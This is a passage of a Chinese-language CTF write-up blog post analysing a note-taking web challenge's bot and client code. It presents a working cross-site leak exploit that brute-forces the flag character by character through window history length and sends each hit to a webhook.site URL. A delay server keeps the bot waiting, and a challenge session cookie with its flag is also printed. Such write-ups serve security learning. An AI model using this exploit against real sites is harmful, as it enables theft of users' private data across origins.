         <span class="comment">// replace with your port</span></span><br><span class="line">        host      : <span class="string">&#x27;redis&#x27;</span>,        <span class="comment">// replace with your hostanme or IP address</span></span><br><span class="line">    &#125;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> puppeteer = <span class="built_in">require</span>(<span class="string">&#x27;puppeteer&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">browse</span>(<span class="params">url</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(process.<span class="property">env</span>.<span class="property">CHALL_COOKIE</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Browsing -&gt; <span class="subst">$&#123;url&#125;</span>`</span>);</span><br><span class="line">    <span class="keyword">const</span> browser = <span class="keyword">await</span> (<span class="keyword">await</span> puppeteer.<span class="title function_">launch</span>(&#123;</span><br><span class="line">        <span class="attr">headless</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="attr">args</span>: [<span class="string">&#x27;--no-sandbox&#x27;</span>, <span class="string">&#x27;--disable-gpu&#x27;</span>],</span><br><span class="line">        <span class="attr">executablePath</span>: <span class="string">&quot;/usr/bin/google-chrome&quot;</span></span><br><span class="line">    &#125;)).<span class="title function_">createIncognitoBrowserContext</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.<span class="title function_">newPage</span>();</span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">setCookie</span>(&#123;</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&#x27;session&#x27;</span>,</span><br><span class="line">        <span class="attr">value</span>: process.<span class="property">env</span>.<span class="property">CHALL_COOKIE</span>,</span><br><span class="line">        <span class="attr">domain</span>: process.<span class="property">env</span>.<span class="property">CHALL_HOST</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> resp = <span class="keyword">await</span> page.<span class="title function_">goto</span>(url, &#123;</span><br><span class="line">            <span class="attr">waitUntil</span>: <span class="string">&#x27;load&#x27;</span>,</span><br><span class="line">            <span class="attr">timeout</span>: <span class="number">20</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> page.<span class="title function_">close</span>();</span><br><span class="line">    <span class="keyword">await</span> browser.<span class="title function_">close</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Done visiting -&gt; <span class="subst">$&#123;url&#125;</span>`</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">ms</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">resolve</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(resolve, ms);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> submit_url = <span class="keyword">await</span> r.<span class="title function_">blPop</span>(</span><br><span class="line">      redis.<span class="title function_">commandOptions</span>(&#123; <span class="attr">isolated</span>: <span class="literal">true</span> &#125;),</span><br><span class="line">      <span class="string">&quot;submissions&quot;</span>,</span><br><span class="line">      <span class="number">0</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">let</span> url = submit_url.<span class="property">element</span>;</span><br><span class="line">    <span class="keyword">await</span> <span class="title function_">browse</span>(url);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">main</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">conn</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">await</span> r.<span class="title function_">connect</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;XSS Bot ready&quot;</span>);</span><br><span class="line"><span class="title function_">conn</span>();</span><br><span class="line"><span class="title function_">main</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>staic&#x2F;main.js</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//init</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">highlighted_note</span> = <span class="keyword">await</span> <span class="title function_">get_higlighted_note</span>();</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search_result&#x27;</span>);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_content</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search_content&#x27;</span>)</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_open</span> = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search_open&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">//highlight note</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;highlighted&#x27;</span>).<span class="property">innerHTML</span> = <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">highlighted_note</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//search handler</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;search_button&#x27;</span>).<span class="property">onclick</span> = search_click;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">search_click</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">search_name</span>(&#123;<span class="string">&#x27;query&#x27;</span>:<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_content</span>.<span class="property">value</span>, <span class="string">&#x27;open&#x27;</span> : <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_open</span>.<span class="property">checked</span>&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> search_query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title function_">atob</span>(location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>)));</span><br><span class="line">    <span class="title function_">search_name</span>(search_query);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">search_name</span>(<span class="params">search_data</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> should_open = search_data[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">    <span class="keyword">let</span> query = search_data[<span class="string">&#x27;query&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> notes = <span class="keyword">await</span> <span class="title function_">get_all_notes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> found_note = notes.<span class="title function_">find</span>(<span class="function">(<span class="params">val</span>) =&gt;</span> val.<span class="property">note</span>.<span class="title function_">toString</span>().<span class="title function_">startsWith</span>(query));</span><br><span class="line">    <span class="keyword">if</span>(found_note == <span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">href</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">text</span> = <span class="string">&#x27;NOT FOUND&#x27;</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">innerHTML</span> += <span class="string">&#x27;&lt;br&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">href</span> = <span class="string">`note/<span class="subst">$&#123;found_note.name&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">text</span> = <span class="string">&#x27;FOUND&#x27;</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">innerHTML</span> += <span class="string">&#x27;&lt;br&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(should_open)<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="title function_">click</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get_all_notes</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>((<span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/notes&#x27;</span>)).<span class="title function_">json</span>()).<span class="title function_">map</span>(<span class="keyword">async</span> (name) =&gt; (&#123;<span class="string">&#x27;name&#x27;</span>:name, <span class="string">&#x27;note&#x27;</span>: (<span class="keyword">await</span> <span class="title function_">get_note</span>(name))&#125;)))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get_higlighted_note</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">get_note</span>((<span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/highlighted_note&#x27;</span>)).<span class="title function_">text</span>()));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get_note</span>(<span class="params">name</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">`/note/<span class="subst">$&#123;name&#125;</span>`</span>)).<span class="title function_">text</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="功能点解析"><a href="#功能点解析" class="headerlink" title="功能点解析"></a>功能点解析</h2><p>首先是对于app.py，这个是客户端的主要逻辑，一共有几个功能，添加、删除、修改、获取、查找notes，主要需要注意的就是<code>notes()</code>函数，他会获取我们Cookie里的notes属性，然后<code>note/path:name</code>这个函数对应的就是查找note了，假如符合的话就会返回内容<br>其次是bot.js，对于bot的行为没什么特殊的，他就是会访问我们的界面而已，有一些坑点需要注意，就比如那个<code>req.ip</code>是获取XFF头的，假如你不加就500了，所以在XFF头随便填一个<code>1,2,3</code>让他不报错就好了，其次就是管理员是带了个Cookie的，比赛附件给的cookie是错的，会导致你本地无法复现成功，因此我自己准备了一个<br><code>- CHALL_COOKIE=eyJub3RlcyI6eyJmbGFnIjoicGJjdGZ7eW91X3NvbHZlXzF0X2dvMGQhfSJ9fQ.ZD6YHg.19wA-HSKvMq1bIyII8Fpze147Ys</code><br>解码后的内容为<code>&#123;&quot;notes&quot;:&#123;&quot;flag&quot;:&quot;pbctf&#123;you_solve_1t_go0d!&#125;&quot;&#125;&#125;</code><br>最后就是主要的main.js了，有一段需要注意</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> found_note = notes.<span class="title function_">find</span>(<span class="function">(<span class="params">val</span>) =&gt;</span> val.<span class="property">note</span>.<span class="title function_">toString</span>().<span class="title function_">startsWith</span>(query));</span><br><span class="line">    <span class="keyword">if</span>(found_note == <span class="literal">undefined</span>)&#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">href</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">text</span> = <span class="string">&#x27;NOT FOUND&#x27;</span></span><br><span class="line">        <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">innerHTML</span> += <span class="string">&#x27;&lt;br&gt;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">href</span> = <span class="string">`note/<span class="subst">$&#123;found_note.name&#125;</span>`</span>;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">text</span> = <span class="string">&#x27;FOUND&#x27;</span></span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="property">innerHTML</span> += <span class="string">&#x27;&lt;br&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span>(should_open)<span class="variable language_">document</span>.<span class="property">body</span>.<span class="property">search_result</span>.<span class="title function_">click</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段明显做了模糊查询的处理，假如开头和notes的内容一致，就会进行跳转，这就是一开始说的二元关系差，有了这一点我们就可以盲注了，其次main.js会获取我们cookies里面的notes：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">get_all_notes</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>((<span class="keyword">await</span> (<span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/notes&#x27;</span>)).<span class="title function_">json</span>()).<span class="title function_">map</span>(<span class="keyword">async</span> (name) =&gt; (&#123;<span class="string">&#x27;name&#x27;</span>:name, <span class="string">&#x27;note&#x27;</span>: (<span class="keyword">await</span> <span class="title function_">get_note</span>(name))&#125;)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这一段就是访问notes路由获取所有的notes，然后有一个部分也有个需要注意的点</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;hashchange&#x27;</span>, <span class="keyword">async</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> search_query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="title function_">atob</span>(location.<span class="property">hash</span>.<span class="title function_">substring</span>(<span class="number">1</span>)));</span><br><span class="line">    <span class="title function_">search_name</span>(search_query);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>他增加了一个叫hashchange的监听器，他会解码<code>location.hash.substring(1)</code>，这个东西是什么呢？我们做一个实验<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681868788336-1195bc22-c950-41f1-afd6-e1f4f25d02bd.png#averageHue=%23efeceb&clientId=u87443d7e-028d-4&from=paste&height=788&id=u84667fa6&name=image.png&originHeight=985&originWidth=1612&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=75961&status=done&style=none&taskId=u21da6808-1802-474f-aa3d-ceb81278502&title=&width=1289.6" alt="image.png"><br>他会获取<code>#</code>后面的内容，也就是锚点作用，如果后面的BASE64字段内容解码后符合search的条件，那就会跳转，如下所示<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681868853008-3cc934aa-00ad-4321-b9bc-8cb2e2599fa6.png#averageHue=%23fbfbfb&clientId=u87443d7e-028d-4&from=paste&height=435&id=u75a86f3a&name=image.png&originHeight=544&originWidth=1508&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=14869&status=done&style=none&taskId=u6353b43a-426b-4f11-ad84-ab81c241004&title=&width=1206.4" alt="image.png"><br>我新建了一个内容为TEST的notes，然后我在URL加上<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681868899463-d1090e9a-fb59-46ff-9732-fdbf518a11f2.png#averageHue=%231b1a1a&clientId=u87443d7e-028d-4&from=paste&height=105&id=ud57f57ba&name=image.png&originHeight=131&originWidth=510&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=8522&status=done&style=none&taskId=u92b612fb-6a94-4db6-b261-c827d01ff7a&title=&width=408" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681868905813-a75871c3-210d-4f77-8c2d-bd0950d20a03.png#averageHue=%231a1a1a&clientId=u87443d7e-028d-4&from=paste&height=63&id=u6967afe3&name=image.png&originHeight=79&originWidth=525&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7119&status=done&style=none&taskId=u4ef49f18-9a63-4a50-b25b-4221f47d3d6&title=&width=420" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681869072125-dbabcb75-ff87-45f0-942d-6bee4507dd1a.png#averageHue=%23e1e1e1&clientId=u87443d7e-028d-4&from=paste&height=204&id=u4c216ab0&name=image.png&originHeight=255&originWidth=1092&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=6737&status=done&style=none&taskId=u449929aa-a973-4a53-b653-1f8b76c2161&title=&width=873.6" alt="image.png"><br>然后就会自动跳转到这里，我们就可以利用这一点进行Xsleaks了</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">xsleaks</span>(<span class="params">leak</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> data = &#123;<span class="string">&#x27;query&#x27;</span>: leak, <span class="string">&#x27;open&#x27;</span>: <span class="literal">true</span>&#125;;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> text = <span class="title function_">btoa</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)).<span class="title function_">replaceAll</span>(<span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> w = <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://114.116.119.253/&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">//fetch(&#x27;https://webhook.site/e2fa3c0c-0935-45e5-b5b4-79763ee8a133?process=&#x27; + leak.slice(-1).charCodeAt());</span></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// fetch(&#x27;https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?openwindow&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            w.<span class="property">location</span> = <span class="string">&#x27;http://114.116.119.253/#&#x27;</span> + text;</span></span><br><span class="line"><span class="language-javascript">             <span class="comment">//fetch(&#x27;https://webhook.site/e2fa3c0c-0935-45e5-b5b4-79763ee8a133?C=&#x27;+text);</span></span></span><br><span class="line"><span class="language-javascript">            <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                w.<span class="property">location</span> = <span class="string">&#x27;about:blank&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">                <span class="comment">// fetch(&#x27;https://webhook.site/6362957d-cd07-41da-b692-9f53e6a644fd?aboutblank&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">                <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="comment">// fetch(&#x27;https://webhook.site/e2fa3c0c-0935-45e5-b5b4-79763ee8a133?historylength=&#x27; + w.history.length);</span></span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(w.<span class="property">history</span>.<span class="property">length</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span> (w.<span class="property">history</span>.<span class="property">length</span> == <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">                        <span class="title function_">fetch</span>(<span class="string">&#x27;https://webhook.site/e2fa3c0c-0935-45e5-b5b4-79763ee8a133?leak=&#x27;</span>,&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">                            		<span class="attr">body</span>: leak</span></span><br><span class="line"><span class="language-javascript">			&#125;).<span class="title function_">catch</span>(<span class="function">(<span class="params">msg</span>) =&gt;</span> &#123;&#125;);</span></span><br><span class="line"><span class="language-javascript">                    &#125;</span></span><br><span class="line"><span class="language-javascript">                    w.<span class="title function_">close</span>();</span></span><br><span class="line"><span class="language-javascript">                &#125;, <span class="number">500</span>)</span></span><br><span class="line"><span class="language-javascript">            &#125;, <span class="number">500</span>);</span></span><br><span class="line"><span class="language-javascript">        &#125;, <span class="number">500</span>);</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> param = <span class="keyword">new</span> <span class="title class_">URLSearchParams</span>(location.<span class="property">search</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> start = param.<span class="title function_">get</span>(<span class="string">&#x27;start&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">ms</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> <span class="built_in">setTimeout</span>(r, ms));</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// xsleaks(&#x27;pbctf&#x27;);</span></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">let</span> sleepTime = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">32</span>; i &lt;= <span class="number">127</span>; i ++) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> c = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(i);</span></span><br><span class="line"><span class="language-javascript">        <span class="built_in">setTimeout</span>(xsleaks, sleepTime, <span class="string">&#x27;pbctf&#123;you_solve_1t_go0d!&#125;&#x27;</span> + c);</span></span><br><span class="line"><span class="language-javascript">        sleepTime +=<span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://114.116.119.253:8002/delay&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/delay&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delay</span>():</span><br><span class="line">	time.sleep(<span class="number">20</span>)</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ok&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="string">&#x27;8002&#x27;</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>这里解释一下这个Flask是怎么回事，他主要起一个延时器的作用，在源码中bot的timeout时限为20s，也就是最多停留在页面20s，那我们就给他delay个20s，在这20s的时间内，让他去leaks，也就是20s后xsleaks就结束，因此flag是不能一步到位的。。</p>
<p>其次的话对于上述payload中timeout时限，经过多次测试，极限是500，500ms的话刚好能在20s内请求127次，爆出一个字段，所以你得自己反复report。直到flag出完</p>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681905845678-3819bb6c-2b77-4424-831e-a7b86700ba72.png#averageHue=%23faf9f9&clientId=u0e0d39f7-e21f-4&from=paste&height=621&id=u2def29d4&name=image.png&originHeight=776&originWidth=1880&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=100494&status=done&style=none&taskId=ue32d973a-0ae1-40cf-92ba-cc8a874098e&title=&width=1504" alt="image.png"></p>
<h1 id="好用的xsleaks平台"><a href="#好用的xsleaks平台" class="headerlink" title="好用的xsleaks平台"></a>好用的xsleaks平台</h1><p><a target="_blank" rel="noopener" href="https://webhook.site/">https://webhook.site/</a><br>这玩意儿不比国内那个xss平台好用多了。</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/CTF/" class="tag">#CTF</a><a href="/tags/Xsleaks/" class="tag">#Xsleaks</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">Apache SCXML2 RCE分析</h3>
                </div>
            </div>
        </a>
        
        
